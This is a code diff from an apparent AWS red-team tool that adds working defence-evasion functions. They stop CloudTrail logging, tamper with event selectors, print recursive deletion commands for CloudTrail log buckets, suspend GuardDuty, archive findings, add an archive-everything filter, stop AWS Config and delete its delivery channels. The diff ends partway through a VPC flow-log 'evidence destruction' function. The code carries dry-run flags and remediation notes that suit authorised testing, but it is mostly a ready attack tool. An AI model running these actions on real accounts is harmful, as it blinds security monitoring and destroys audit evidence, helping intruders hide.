@@ -7,198 +7,254 @@ export async function cloudtrailBlind(args: string[], timeout: number): Promise<
   const profile = argVal(args, "--profile")
   const region = argVal(args, "--region")
   const trailName = argVal(args, "--trail-name")
+  const execute = hasFlag(args, "--execute")
+  const findings: Finding[] = []
+  const output: string[] = ["[*] CloudTrail Blind — Logging Disruption\n"]
+
+  const id = await aws(["sts", "get-caller-identity"], profile, region, timeout)
+  if (id.exitCode !== 0) return { output: `[-] No valid credentials: ${id.stderr.trim()}`, findings }
+  const identity = tryJson(id.stdout) || {}
+  const callerArn = (identity.Arn || "") as string
+  output.push(`[+] Identity: ${callerArn}`)
+
+  const actions = ["cloudtrail:DescribeTrails", "cloudtrail:GetTrailStatus", "cloudtrail:StopLogging", "cloudtrail:PutEventSelectors"]
+  const sim = await aws(["iam", "simulate-principal-policy", "--policy-source-arn", callerArn, "--action-names", ...actions], profile, region, timeout)
+  const results = tryJson(sim.stdout)?.EvaluationResults || []
+  const allowed = new Set((results as Record<string, string>[]).filter(r => r.EvalDecision === "allowed").map(r => r.EvalActionName))
+
+  output.push(`\n[*] Pre-flight permission check:`)
+  for (const a of actions) output.push(`  ${allowed.has(a) ? "[+] ALLOWED" : "[-] DENIED"}: ${a}`)
+
+  output.push(`\n[*] CloudTrail events: StopLogging, PutEventSelectors, DeleteTrail`)
+  output.push(`[*] GuardDuty: Stealth:IAMUser/CloudTrailLoggingDisabled (HIGH)`)
+
+  const r = await aws(["cloudtrail", "describe-trails"], profile, region, timeout)
+  if (r.exitCode !== 0) return { output: output.join("\n") + `\n[-] Cannot describe trails: ${r.stderr.trim()}`, findings }
+  const trails = tryJson(r.stdout)?.trailList || []
+  output.push(`\n[+] Trails: ${trails.length}`)
+
+  for (const t of trails as Record<string, unknown>[]) {
+    const status = await aws(["cloudtrail", "get-trail-status", "--name", t.Name as string], profile, region, timeout)
+    const s = tryJson(status.stdout)
+    const isOrg = t.IsOrganizationTrail === true
+    const isMulti = t.IsMultiRegionTrail === true
+    output.push(`\n  ${t.Name}: logging=${s?.IsLogging} multi-region=${isMulti} org=${isOrg} bucket=${t.S3BucketName}`)
+    if (t.CloudWatchLogsLogGroupArn) output.push(`    CloudWatch: ${t.CloudWatchLogsLogGroupArn} — alarm may trigger on disable`)
+    if (t.SnsTopicARN) output.push(`    SNS: ${t.SnsTopicARN} — notifications active`)
+    if (isOrg) output.push(`    [!] Organization trail — cannot stop from member account`)
+    if (t.KmsKeyId) output.push(`    KMS: ${t.KmsKeyId}`)
+
+    const sel = await aws(["cloudtrail", "get-event-selectors", "--trail-name", t.Name as string], profile, region, timeout)
+    if (sel.exitCode === 0) {
+      const selData = tryJson(sel.stdout)
+      const selectors = selData?.EventSelectors || []
+      for (const es of selectors as Record<string, unknown>[]) {
+        output.push(`    Selectors: ReadWrite=${es.ReadWriteType} MgmtEvents=${es.IncludeManagementEvents}`)
+        const excludes = (es.ExcludeManagementEventSources || []) as string[]
+        if (excludes.length > 0) output.push(`    Excluded sources: ${excludes.join(", ")}`)
+        const dataRes = (es.DataResources || []) as Record<string, unknown>[]
+        if (dataRes.length > 0) output.push(`    Data resources: ${dataRes.map(d => d.Type).join(", ")}`)
+      }
+    }
+  }
 
   if (action === "status") {
-    const r = await aws(["cloudtrail", "describe-trails"], profile, region, timeout)
-    if (r.exitCode !== 0) return { output: `[-] Cannot describe trails: ${r.stderr.trim()}`, findings: [] }
-    const trails = tryJson(r.stdout)?.trailList || []
-    const output = [`[*] CloudTrail status — ${trails.length} trail(s)\n`]
-    for (const t of trails) {
-      const status = await aws(["cloudtrail", "get-trail-status", "--name", t.Name], profile, region, timeout)
-      const s = tryJson(status.stdout)
-      output.push(`[+] ${t.Name}: logging=${s?.IsLogging}, multi-region=${t.IsMultiRegionTrail}`)
-    }
-    return { output: output.join("\n"), findings: [] }
+    const viable: string[] = []
+    if (allowed.has("cloudtrail:StopLogging")) viable.push("stop")
+    if (allowed.has("cloudtrail:PutEventSelectors")) viable.push("modify_selectors")
+    viable.push("delete_logs (S3 access needed separately)")
+    output.push(`\n[*] Viable actions: ${viable.join(", ")}`)
+    output.push(`[*] Use --action stop|modify_selectors|delete_logs [--trail-name <name>] [--execute]`)
+    return { output: output.join("\n"), findings }
   }
 
   if (action === "stop") {
-    const name =
-      trailName ||
-      (await (async () => {
-        const r = await aws(["cloudtrail", "describe-trails", "--query", "trailList[0].Name"], profile, region, timeout)
-        return tryJson(r.stdout)
-      })())
-    if (!name) return { output: "[-] No trail found", findings: [] }
-    const r = await aws(["cloudtrail", "stop-logging", "--name", name], profile, region, timeout)
-    return r.exitCode === 0
-      ? { output: `[+] Stopped logging on trail: ${name}`, findings: [] }
-      : { output: `[-] Failed to stop: ${r.stderr.trim()}`, findings: [] }
+    if (!allowed.has("cloudtrail:StopLogging")) {
+      output.push(`\n[-] cloudtrail:StopLogging DENIED — vector blocked`)
+      findings.push({ checkId: "AWS-EVASION-CT-001", provider: "aws", severity: "info", status: "BLOCKED", resource: `iam://${callerArn}`, title: "CloudTrail stop-logging blocked — insufficient permissions", details: "Cannot stop CloudTrail logging", remediation: "N/A" })
+      return { output: output.join("\n"), findings }
+    }
+    const name = trailName || (trails[0] as Record<string, string>)?.Name
+    if (!name) return { output: output.join("\n") + "\n[-] No trail found", findings }
+    const isOrg = (trails as Record<string, unknown>[]).find(t => t.Name === name)?.IsOrganizationTrail === true
+    if (isOrg) {
+      output.push(`\n[!] ${name} is an organization trail — StopLogging will fail from member account`)
+      findings.push({ checkId: "AWS-EVASION-CT-002", provider: "aws", severity: "info", status: "BLOCKED", resource: `cloudtrail://${name}`, title: `Organization trail cannot be stopped: ${name}`, details: "Only the management account or delegated admin can stop an organization trail", remediation: "Target non-org trails or escalate to management account" })
+    }
+    if (!execute) {
+      output.push(`\n[+] DRY RUN — would stop logging on: ${name}`)
+      output.push(`[*] Run with --execute to perform`)
+      findings.push({ checkId: "AWS-EVASION-CT-003", provider: "aws", severity: "critical", status: "READY", resource: `cloudtrail://${name}`, title: `CloudTrail stop-logging viable: ${name}`, details: `Identity can StopLogging — trail will go dark`, remediation: "Restrict cloudtrail:StopLogging via SCP, enable CloudWatch alarm on StatusNotification" })
+      return { output: output.join("\n"), findings }
+    }
+    const stop = await aws(["cloudtrail", "stop-logging", "--name", name], profile, region, timeout)
+    if (stop.exitCode === 0) {
+      output.push(`\n[+] Stopped logging on trail: ${name}`)
+      findings.push({ checkId: "AWS-EVASION-CT-003", provider: "aws", severity: "critical", status: "DISABLED", resource: `cloudtrail://${name}`, title: `CloudTrail logging stopped: ${name}`, details: "All API activity no longer recorded — GuardDuty will fire Stealth:IAMUser/CloudTrailLoggingDisabled", remediation: `Restart: aws cloudtrail start-logging --name ${name}` })
+    } else {
+      output.push(`\n[-] Stop failed: ${stop.stderr.trim()}`)
+    }
+    return { output: output.join("\n"), findings }
   }
 
   if (action === "modify_selectors") {
-    const name =
-      trailName ||
-      (await (async () => {
-        const r = await aws(["cloudtrail", "describe-trails", "--query", "trailList[0].Name"], profile, region, timeout)
-        return tryJson(r.stdout)
-      })())
-    if (!name) return { output: "[-] No trail found", findings: [] }
-    const r = await aws(
-      [
-        "cloudtrail",
-        "put-event-selectors",
-        "--trail-name",
-        name,
-        "--event-selectors",
-        '[{"ReadWriteType":"ReadOnly","IncludeManagementEvents":false}]',
-      ],
-      profile,
-      region,
-      timeout,
-    )
-    return r.exitCode === 0
-      ? { output: `[+] Event selectors modified on ${name} — management events excluded`, findings: [] }
-      : { output: `[-] Failed: ${r.stderr.trim()}`, findings: [] }
+    if (!allowed.has("cloudtrail:PutEventSelectors")) {
+      output.push(`\n[-] cloudtrail:PutEventSelectors DENIED — vector blocked`)
+      findings.push({ checkId: "AWS-EVASION-CT-004", provider: "aws", severity: "info", status: "BLOCKED", resource: `iam://${callerArn}`, title: "CloudTrail selector modification blocked", details: "Cannot modify event selectors", remediation: "N/A" })
+      return { output: output.join("\n"), findings }
+    }
+    const name = trailName || (trails[0] as Record<string, string>)?.Name
+    if (!name) return { output: output.join("\n") + "\n[-] No trail found", findings }
+    if (!execute) {
+      output.push(`\n[+] DRY RUN — would modify selectors on: ${name}`)
+      output.push(`    Set ReadWriteType=ReadOnly, IncludeManagementEvents=false`)
+      output.push(`    Effect: write operations (Create*, Delete*, Put*, Update*) become invisible`)
+      output.push(`[*] Run with --execute to perform`)
+      findings.push({ checkId: "AWS-EVASION-CT-005", provider: "aws", severity: "critical", status: "READY", resource: `cloudtrail://${name}`, title: `CloudTrail selector tampering viable: ${name}`, details: "Can exclude management write events — stealthier than full stop", remediation: "Monitor PutEventSelectors in CloudTrail, use SCP to deny" })
+      return { output: output.join("\n"), findings }
+    }
+    const mod = await aws(["cloudtrail", "put-event-selectors", "--trail-name", name, "--event-selectors", '[{"ReadWriteType":"ReadOnly","IncludeManagementEvents":false}]'], profile, region, timeout)
+    if (mod.exitCode === 0) {
+      output.push(`\n[+] Event selectors modified on ${name} — management write events excluded`)
+      findings.push({ checkId: "AWS-EVASION-CT-005", provider: "aws", severity: "critical", status: "MODIFIED", resource: `cloudtrail://${name}`, title: `CloudTrail selectors tampered: ${name}`, details: "Management write events no longer logged — stealthier than StopLogging (no GuardDuty alert for this)", remediation: `Restore: aws cloudtrail put-event-selectors --trail-name ${name} --event-selectors '[{"ReadWriteType":"All","IncludeManagementEvents":true}]'` })
+    } else {
+      output.push(`\n[-] Failed: ${mod.stderr.trim()}`)
+    }
+    return { output: output.join("\n"), findings }
   }
 
   if (action === "delete_logs") {
-    const r = await aws(
-      ["cloudtrail", "describe-trails", "--query", "trailList[0].S3BucketName"],
-      profile,
-      region,
-      timeout,
-    )
-    const bucket = tryJson(r.stdout)
-    if (!bucket) return { output: "[-] Cannot find CloudTrail S3 bucket", findings: [] }
-    return {
-      output: `[*] CloudTrail logs in: s3://${bucket}\n[+] Use: aws s3 rm s3://${bucket}/AWSLogs/ --recursive`,
-      findings: [],
-    }
+    const bucket = (trails[0] as Record<string, string>)?.S3BucketName
+    if (!bucket) return { output: output.join("\n") + "\n[-] Cannot find CloudTrail S3 bucket", findings }
+    output.push(`\n[*] CloudTrail logs in: s3://${bucket}`)
+    output.push(`[+] Deletion commands:`)
+    output.push(`  aws s3 rm s3://${bucket}/AWSLogs/ --recursive`)
+    output.push(`  aws s3api delete-objects --bucket ${bucket} --delete "$(aws s3api list-object-versions --bucket ${bucket} --prefix AWSLogs/ --query '{Objects: Versions[].{Key:Key,VersionId:VersionId}}' --output json)"`)
+    output.push(`\n[*] Note: bucket policy/ACL or MFA-delete may block deletion`)
+    output.push(`[*] Versioned buckets require version-aware delete`)
+    findings.push({ checkId: "AWS-EVASION-CT-006", provider: "aws", severity: "high", status: "INFO", resource: `s3://${bucket}`, title: `CloudTrail log bucket identified: ${bucket}`, details: "S3 bucket contains CloudTrail logs — delete requires s3:DeleteObject on bucket", remediation: "Enable MFA delete, bucket versioning, and Object Lock on CloudTrail buckets" })
+    return { output: output.join("\n"), findings }
   }
 
-  return { output: `ERROR: Unknown action: ${action}`, findings: [] }
+  return { output: output.join("\n") + `\nERROR: Unknown action: ${action}`, findings }
 }
 
 export async function guarddutyEvade(args: string[], timeout: number): Promise<HookResult> {
   const action = argVal(args, "--action") || "status"
   const profile = argVal(args, "--profile")
   const region = argVal(args, "--region")
+  const execute = hasFlag(args, "--execute")
   const output: string[] = ["[*] GuardDuty Evasion\n"]
   const findings: Finding[] = []
 
+  const id = await aws(["sts", "get-caller-identity"], profile, region, timeout)
+  if (id.exitCode !== 0) return { output: `[-] No valid credentials: ${id.stderr.trim()}`, findings }
+  const callerArn = (tryJson(id.stdout)?.Arn || "") as string
+  output.push(`[+] Identity: ${callerArn}`)
+
+  const actions = ["guardduty:ListDetectors", "guardduty:GetDetector", "guardduty:UpdateDetector", "guardduty:CreateFilter", "guardduty:ArchiveFindings", "guardduty:ListFindings"]
+  const sim = await aws(["iam", "simulate-principal-policy", "--policy-source-arn", callerArn, "--action-names", ...actions], profile, region, timeout)
+  const results = tryJson(sim.stdout)?.EvaluationResults || []
+  const allowed = new Set((results as Record<string, string>[]).filter(r => r.EvalDecision === "allowed").map(r => r.EvalActionName))
+
+  output.push(`\n[*] Pre-flight permission check:`)
+  for (const a of actions) output.push(`  ${allowed.has(a) ? "[+] ALLOWED" : "[-] DENIED"}: ${a}`)
+
+  output.push(`\n[*] CloudTrail events: UpdateDetector, CreateFilter, ArchiveFindings`)
+  output.push(`[*] GuardDuty: meta-evasion — disabling the tool that detects evasion`)
+  output.push(`[*] Note: org-managed detectors cannot be modified from member accounts`)
+
   const detectors = await aws(["guardduty", "list-detectors", "--query", "DetectorIds"], profile, region, timeout)
-  if (detectors.exitCode !== 0) return { output: `[-] Cannot list detectors: ${detectors.stderr.trim()}`, findings }
+  if (detectors.exitCode !== 0) return { output: output.join("\n") + `\n[-] Cannot list detectors: ${detectors.stderr.trim()}`, findings }
 
   const dl = tryJson(detectors.stdout) || []
-  output.push(`[+] GuardDuty Detectors: ${dl.length}`)
+  output.push(`\n[+] GuardDuty Detectors: ${dl.length}`)
 
   for (const detectorId of dl) {
     const desc = await aws(["guardduty", "get-detector", "--detector-id", detectorId], profile, region, timeout)
     if (desc.exitCode === 0) {
-      const det = tryJson(desc.stdout)
-      output.push(`\n    ${detectorId} — status: ${det?.Status} — updated: ${det?.UpdatedAt}`)
-      const features = det?.Features || []
-      for (const f of features) output.push(`      ${f.Name}: ${f.Status}`)
+      const det = tryJson(desc.stdout) || {}
+      output.push(`\n  ${detectorId} — status: ${det.Status} — updated: ${det.UpdatedAt}`)
+      const features = det.Features || []
+      for (const f of features as Record<string, string>[]) output.push(`    ${f.Name}: ${f.Status}`)
+      if (det.FindingPublishingFrequency) output.push(`    Publishing: ${det.FindingPublishingFrequency}`)
+
+      const admin = await aws(["guardduty", "get-administrator-account", "--detector-id", detectorId], profile, region, timeout)
+      if (admin.exitCode === 0) {
+        const adm = tryJson(admin.stdout)?.Administrator
+        if (adm?.AccountId) {
+          output.push(`    [!] Org-managed by admin: ${adm.AccountId} (${adm.RelationshipStatus}) — suspend may be blocked`)
+        }
+      }
+
+      const existing = await aws(["guardduty", "list-filters", "--detector-id", detectorId, "--query", "FilterNames"], profile, region, timeout)
+      if (existing.exitCode === 0) {
+        const ef = tryJson(existing.stdout) || []
+        if (ef.length > 0) output.push(`    Existing filters: ${ef.join(", ")}`)
+      }
     }
 
     if (action === "suspend") {
-      const r = await aws(
-        ["guardduty", "update-detector", "--detector-id", detectorId, "--no-enable"],
-        profile,
-        region,
-        timeout,
-      )
+      if (!allowed.has("guardduty:UpdateDetector")) {
+        output.push(`    [-] guardduty:UpdateDetector DENIED — suspend blocked`)
+        findings.push({ checkId: "AWS-EVASION-GD-001", provider: "aws", severity: "info", status: "BLOCKED", resource: `guardduty:${detectorId}`, title: "GuardDuty suspend blocked — insufficient permissions", details: "Cannot disable GuardDuty detector", remediation: "N/A" })
+        continue
+      }
+      if (!execute) {
+        output.push(`    [+] DRY RUN — would suspend detector: ${detectorId}`)
+        findings.push({ checkId: "AWS-EVASION-001", provider: "aws", severity: "critical", status: "READY", resource: `guardduty:${detectorId}`, title: `GuardDuty suspend viable: ${detectorId}`, details: "UpdateDetector permission confirmed — detector can be disabled", remediation: "Restrict guardduty:UpdateDetector via SCP" })
+        continue
+      }
+      const r = await aws(["guardduty", "update-detector", "--detector-id", detectorId, "--no-enable"], profile, region, timeout)
       if (r.exitCode === 0) {
         output.push(`    [+] Detector ${detectorId} SUSPENDED`)
-        findings.push({
-          checkId: "AWS-EVASION-001",
-          provider: "aws",
-          severity: "critical",
-          status: "DISABLED",
-          resource: `guardduty:${detectorId}`,
-          title: `GuardDuty detector suspended: ${detectorId}`,
-          details: "GuardDuty threat detection disabled",
-          remediation: "Re-enable: aws guardduty update-detector --detector-id " + detectorId + " --enable",
-        })
+        findings.push({ checkId: "AWS-EVASION-001", provider: "aws", severity: "critical", status: "DISABLED", resource: `guardduty:${detectorId}`, title: `GuardDuty detector suspended: ${detectorId}`, details: "GuardDuty threat detection disabled — CloudTrail event: UpdateDetector", remediation: "Re-enable: aws guardduty update-detector --detector-id " + detectorId + " --enable" })
       } else {
         output.push(`    [-] Suspend failed: ${r.stderr.trim()}`)
       }
     }
 
     if (action === "suppress") {
-      const gdFindings = await aws(
-        [
-          "guardduty",
-          "list-findings",
-          "--detector-id",
-          detectorId,
-          "--finding-criteria",
-          '{"Criterion":{"severity":{"Gte":7}}}',
-        ],
-        profile,
-        region,
-        timeout,
-      )
+      if (!allowed.has("guardduty:ArchiveFindings")) {
+        output.push(`    [-] guardduty:ArchiveFindings DENIED — suppress blocked`)
+        findings.push({ checkId: "AWS-EVASION-GD-002", provider: "aws", severity: "info", status: "BLOCKED", resource: `guardduty:${detectorId}`, title: "GuardDuty finding suppression blocked", details: "Cannot archive findings", remediation: "N/A" })
+        continue
+      }
+      const gdFindings = await aws(["guardduty", "list-findings", "--detector-id", detectorId, "--finding-criteria", '{"Criterion":{"severity":{"Gte":7}}}'], profile, region, timeout)
       if (gdFindings.exitCode === 0) {
         const fl = tryJson(gdFindings.stdout)?.FindingIds || []
         output.push(`\n    [+] High-severity findings: ${fl.length}`)
         if (fl.length > 0) {
-          const archive = await aws(
-            ["guardduty", "archive-findings", "--detector-id", detectorId, "--finding-ids", ...fl.slice(0, 50)],
-            profile,
-            region,
-            timeout,
-          )
+          if (!execute) {
+            output.push(`    [+] DRY RUN — would archive ${Math.min(fl.length, 50)} finding(s)`)
+            findings.push({ checkId: "AWS-EVASION-002", provider: "aws", severity: "high", status: "READY", resource: `guardduty:${detectorId}`, title: `GuardDuty finding suppression viable: ${fl.length} findings`, details: "ArchiveFindings permission confirmed", remediation: "Restrict guardduty:ArchiveFindings" })
+            continue
+          }
+          const archive = await aws(["guardduty", "archive-findings", "--detector-id", detectorId, "--finding-ids", ...fl.slice(0, 50)], profile, region, timeout)
           if (archive.exitCode === 0) {
             output.push(`    [+] Archived ${Math.min(fl.length, 50)} finding(s)`)
-            findings.push({
-              checkId: "AWS-EVASION-002",
-              provider: "aws",
-              severity: "high",
-              status: "SUPPRESSED",
-              resource: `guardduty:${detectorId}`,
-              title: `GuardDuty findings archived: ${Math.min(fl.length, 50)}`,
-              details: "High-severity findings archived to hide activity",
-              remediation: "Unarchive findings and review for legitimate threats",
-            })
+            findings.push({ checkId: "AWS-EVASION-002", provider: "aws", severity: "high", status: "SUPPRESSED", resource: `guardduty:${detectorId}`, title: `GuardDuty findings archived: ${Math.min(fl.length, 50)}`, details: "High-severity findings archived to hide activity — CloudTrail event: ArchiveFindings", remediation: "Unarchive findings and review for legitimate threats" })
           }
         }
       }
     }
 
     if (action === "filter") {
-      const filter = await aws(
-        [
-          "guardduty",
-          "create-filter",
-          "--detector-id",
-          detectorId,
-          "--name",
-          "cs-suppress-all",
-          "--action",
-          "ARCHIVE",
-          "--finding-criteria",
-          '{"Criterion":{"severity":{"Gte":1}}}',
-          "--tags",
-          "CreatedBy=CyberStrike",
-        ],
-        profile,
-        region,
-        timeout,
-      )
+      if (!allowed.has("guardduty:CreateFilter")) {
+        output.push(`    [-] guardduty:CreateFilter DENIED — filter creation blocked`)
+        findings.push({ checkId: "AWS-EVASION-GD-003", provider: "aws", severity: "info", status: "BLOCKED", resource: `guardduty:${detectorId}`, title: "GuardDuty filter creation blocked", details: "Cannot create auto-archive filter", remediation: "N/A" })
+        continue
+      }
+      if (!execute) {
+        output.push(`    [+] DRY RUN — would create auto-archive filter on: ${detectorId}`)
+        output.push(`    Effect: all future findings auto-archived (severity >= 1)`)
+        findings.push({ checkId: "AWS-EVASION-003", provider: "aws", severity: "critical", status: "READY", resource: `guardduty:${detectorId}:filter`, title: "GuardDuty auto-archive filter viable", details: "CreateFilter permission confirmed — all future findings will be hidden", remediation: "Restrict guardduty:CreateFilter via SCP" })
+        continue
+      }
+      const filter = await aws(["guardduty", "create-filter", "--detector-id", detectorId, "--name", "cs-suppress-all", "--action", "ARCHIVE", "--finding-criteria", '{"Criterion":{"severity":{"Gte":1}}}', "--tags", "CreatedBy=CyberStrike"], profile, region, timeout)
       if (filter.exitCode === 0) {
         output.push(`    [+] Auto-archive filter created: cs-suppress-all`)
-        findings.push({
-          checkId: "AWS-EVASION-003",
-          provider: "aws",
-          severity: "critical",
-          status: "CREATED",
-          resource: `guardduty:${detectorId}:filter`,
-          title: "GuardDuty auto-archive filter created",
-          details: "All future findings will be automatically archived",
-          remediation:
-            "Delete filter: aws guardduty delete-filter --detector-id " + detectorId + " --filter-name cs-suppress-all",
-        })
+        findings.push({ checkId: "AWS-EVASION-003", provider: "aws", severity: "critical", status: "CREATED", resource: `guardduty:${detectorId}:filter`, title: "GuardDuty auto-archive filter created", details: "All future findings will be automatically archived — CloudTrail event: CreateFilter", remediation: "Delete filter: aws guardduty delete-filter --detector-id " + detectorId + " --filter-name cs-suppress-all" })
       } else {
         output.push(`    [-] Filter creation failed: ${filter.stderr.trim()}`)
       }
@@ -206,7 +262,12 @@ export async function guarddutyEvade(args: string[], timeout: number): Promise<H
   }
 
   if (action === "status") {
-    output.push("\n[*] Actions: --action suspend | suppress | filter")
+    const viable: string[] = []
+    if (allowed.has("guardduty:UpdateDetector")) viable.push("suspend")
+    if (allowed.has("guardduty:ArchiveFindings")) viable.push("suppress")
+    if (allowed.has("guardduty:CreateFilter")) viable.push("filter")
+    output.push(`\n[*] Viable actions: ${viable.length > 0 ? viable.join(", ") : "NONE — all evasion vectors blocked"}`)
+    output.push(`[*] Use --action suspend|suppress|filter [--execute]`)
   }
 
   return { output: output.join("\n"), findings }
@@ -216,45 +277,60 @@ export async function configDisable(args: string[], timeout: number): Promise<Ho
   const action = argVal(args, "--action") || "status"
   const profile = argVal(args, "--profile")
   const region = argVal(args, "--region")
-  const output: string[] = ["[*] AWS Config Recorder\n"]
+  const execute = hasFlag(args, "--execute")
+  const output: string[] = ["[*] AWS Config Recorder — Compliance Evasion\n"]
   const findings: Finding[] = []
 
+  const id = await aws(["sts", "get-caller-identity"], profile, region, timeout)
+  if (id.exitCode !== 0) return { output: `[-] No valid credentials: ${id.stderr.trim()}`, findings }
+  const callerArn = (tryJson(id.stdout)?.Arn || "") as string
+  output.push(`[+] Identity: ${callerArn}`)
+
+  const actions = ["config:DescribeConfigurationRecorders", "config:StopConfigurationRecorder", "config:DeleteDeliveryChannel", "config:DescribeDeliveryChannels"]
+  const sim = await aws(["iam", "simulate-principal-policy", "--policy-source-arn", callerArn, "--action-names", ...actions], profile, region, timeout)
+  const results = tryJson(sim.stdout)?.EvaluationResults || []
+  const allowed = new Set((results as Record<string, string>[]).filter(r => r.EvalDecision === "allowed").map(r => r.EvalActionName))
+
+  output.push(`\n[*] Pre-flight permission check:`)
+  for (const a of actions) output.push(`  ${allowed.has(a) ? "[+] ALLOWED" : "[-] DENIED"}: ${a}`)
+
+  output.push(`\n[*] CloudTrail events: StopConfigurationRecorder, DeleteDeliveryChannel`)
+  output.push(`[*] Detection: AWS Config rule noncompliant state, CloudWatch alarm on recorder status`)
+
   const recorders = await aws(["configservice", "describe-configuration-recorders"], profile, region, timeout)
-  if (recorders.exitCode !== 0) return { output: `[-] Cannot describe recorders: ${recorders.stderr.trim()}`, findings }
+  if (recorders.exitCode !== 0) return { output: output.join("\n") + `\n[-] Cannot describe recorders: ${recorders.stderr.trim()}`, findings }
 
   const rl = tryJson(recorders.stdout)?.ConfigurationRecorders || []
-  output.push(`[+] Configuration Recorders: ${rl.length}`)
+  output.push(`\n[+] Configuration Recorders: ${rl.length}`)
 
-  for (const rec of rl) {
-    const status = await aws(
-      ["configservice", "describe-configuration-recorder-status", "--configuration-recorder-names", rec.name],
-      profile,
-      region,
-      timeout,
-    )
+  for (const rec of rl as Record<string, unknown>[]) {
+    const status = await aws(["configservice", "describe-configuration-recorder-status", "--configuration-recorder-names", rec.name as string], profile, region, timeout)
     const s = tryJson(status.stdout)?.ConfigurationRecordersStatus?.[0]
-    output.push(`    ${rec.name} — recording: ${s?.recording} — last status: ${s?.lastStatus}`)
+    output.push(`\n  ${rec.name} — recording: ${s?.recording} — last status: ${s?.lastStatus}`)
+    const group = rec.recordingGroup as Record<string, unknown> | undefined
+    if (group) {
+      output.push(`    All resources: ${group.allSupported} — global: ${group.includeGlobalResourceTypes}`)
+      const specific = group.resourceTypes as string[] | undefined
+      if (specific?.length) output.push(`    Specific types: ${specific.slice(0, 10).join(", ")}${specific.length > 10 ? ` (+${specific.length - 10} more)` : ""}`)
+    }
+    const roleArn = rec.roleARN as string | undefined
+    if (roleArn) output.push(`    Role: ${roleArn}`)
 
     if (action === "stop") {
-      const r = await aws(
-        ["configservice", "stop-configuration-recorder", "--configuration-recorder-name", rec.name],
-        profile,
-        region,
-        timeout,
-      )
+      if (!allowed.has("config:StopConfigurationRecorder")) {
+        output.push(`    [-] config:StopConfigurationRecorder DENIED — blocked`)
+        findings.push({ checkId: "AWS-EVASION-CFG-001", provider: "aws", severity: "info", status: "BLOCKED", resource: `config:${rec.name}`, title: "Config recorder stop blocked", details: "Cannot stop AWS Config recording", remediation: "N/A" })
+        continue
+      }
+      if (!execute) {
+        output.push(`    [+] DRY RUN — would stop recorder: ${rec.name}`)
+        findings.push({ checkId: "AWS-EVASION-004", provider: "aws", severity: "critical", status: "READY", resource: `config:${rec.name}`, title: `Config recorder stop viable: ${rec.name}`, details: "StopConfigurationRecorder permission confirmed — resource changes will go untracked", remediation: "Restrict config:StopConfigurationRecorder via SCP" })
+        continue
+      }
+      const r = await aws(["configservice", "stop-configuration-recorder", "--configuration-recorder-name", rec.name as string], profile, region, timeout)
       if (r.exitCode === 0) {
         output.push(`    [+] Recorder stopped: ${rec.name}`)
-        findings.push({
-          checkId: "AWS-EVASION-004",
-          provider: "aws",
-          severity: "critical",
-          status: "DISABLED",
-          resource: `config:${rec.name}`,
-          title: `AWS Config recorder stopped: ${rec.name}`,
-          details: "Configuration recording disabled — changes will not be tracked",
-          remediation:
-            "Restart: aws configservice start-configuration-recorder --configuration-recorder-name " + rec.name,
-        })
+        findings.push({ checkId: "AWS-EVASION-004", provider: "aws", severity: "critical", status: "DISABLED", resource: `config:${rec.name}`, title: `AWS Config recorder stopped: ${rec.name}`, details: "Configuration recording disabled — resource changes will not be tracked. CloudTrail event: StopConfigurationRecorder", remediation: "Restart: aws configservice start-configuration-recorder --configuration-recorder-name " + rec.name })
       } else {
         output.push(`    [-] Stop failed: ${r.stderr.trim()}`)
       }
@@ -265,21 +341,44 @@ export async function configDisable(args: string[], timeout: number): Promise<Ho
   if (channels.exitCode === 0) {
     const cl = tryJson(channels.stdout)?.DeliveryChannels || []
     output.push(`\n[+] Delivery Channels: ${cl.length}`)
-    for (const ch of cl) {
-      output.push(`    ${ch.name} — bucket: ${ch.s3BucketName} — SNS: ${ch.snsTopicARN || "none"}`)
+    for (const ch of cl as Record<string, string>[]) {
+      output.push(`  ${ch.name} — bucket: ${ch.s3BucketName} — SNS: ${ch.snsTopicARN || "none"}`)
       if (action === "delete_channel") {
-        const r = await aws(
-          ["configservice", "delete-delivery-channel", "--delivery-channel-name", ch.name],
-          profile,
-          region,
-          timeout,
-        )
-        if (r.exitCode === 0) output.push(`    [+] Channel deleted: ${ch.name}`)
+        if (!allowed.has("config:DeleteDeliveryChannel")) {
+          output.push(`    [-] config:DeleteDeliveryChannel DENIED — blocked`)
+          continue
+        }
+        if (!execute) {
+          output.push(`    [+] DRY RUN — would delete channel: ${ch.name}`)
+          findings.push({ checkId: "AWS-EVASION-CFG-002", provider: "aws", severity: "critical", status: "READY", resource: `config:channel:${ch.name}`, title: `Config delivery channel deletion viable: ${ch.name}`, details: `Config snapshots to ${ch.s3BucketName} will stop`, remediation: "Restrict config:DeleteDeliveryChannel via SCP" })
+          continue
+        }
+        const r = await aws(["configservice", "delete-delivery-channel", "--delivery-channel-name", ch.name], profile, region, timeout)
+        if (r.exitCode === 0) {
+          output.push(`    [+] Channel deleted: ${ch.name}`)
+          findings.push({ checkId: "AWS-EVASION-CFG-002", provider: "aws", severity: "critical", status: "DELETED", resource: `config:channel:${ch.name}`, title: `Config delivery channel deleted: ${ch.name}`, details: `Config snapshots to ${ch.s3BucketName} stopped. CloudTrail event: DeleteDeliveryChannel`, remediation: "Recreate delivery channel with same S3/SNS config" })
+        }
       }
     }
   }
 
-  if (action === "status") output.push("\n[*] Actions: --action stop | delete_channel")
+  const agg = await aws(["configservice", "describe-configuration-aggregators", "--query", "ConfigurationAggregators[].[ConfigurationAggregatorName,ConfigurationAggregatorArn]"], profile, region, timeout)
+  if (agg.exitCode === 0) {
+    const al = tryJson(agg.stdout) || []
+    if (al.length > 0) {
+      output.push(`\n[+] Config Aggregators: ${al.length}`)
+      for (const a of al) output.push(`  ${a[0]}`)
+      output.push(`  [!] Aggregator present — centralized team may detect recorder stop`)
+    }
+  }
+
+  if (action === "status") {
+    const viable: string[] = []
+    if (allowed.has("config:StopConfigurationRecorder")) viable.push("stop")
+    if (allowed.has("config:DeleteDeliveryChannel")) viable.push("delete_channel")
+    output.push(`\n[*] Viable actions: ${viable.length > 0 ? viable.join(", ") : "NONE"}`)
+    output.push(`[*] Use --action stop|delete_channel [--execute]`)
+  }
 
   return { output: output.join("\n"), findings }
 }
@@ -288,48 +387,72 @@ export async function vpcFlowDisable(args: string[], timeout: number): Promise<H
   const action = argVal(args, "--action") || "status"
   const profile = argVal(args, "--profile")
   const region = argVal(args, "--region")
-  const output: string[] = ["[*] VPC Flow Logs\n"]
+  const execute = hasFlag(args, "--execute")
+  const output: string[] = ["[*] VPC Flow Logs — Network Evidence Destruction\n"]
   const findings: Finding[] = []
 
-  const flowLogs = await aws(
-    [
-      "ec2",
-      "describe-flow-logs",
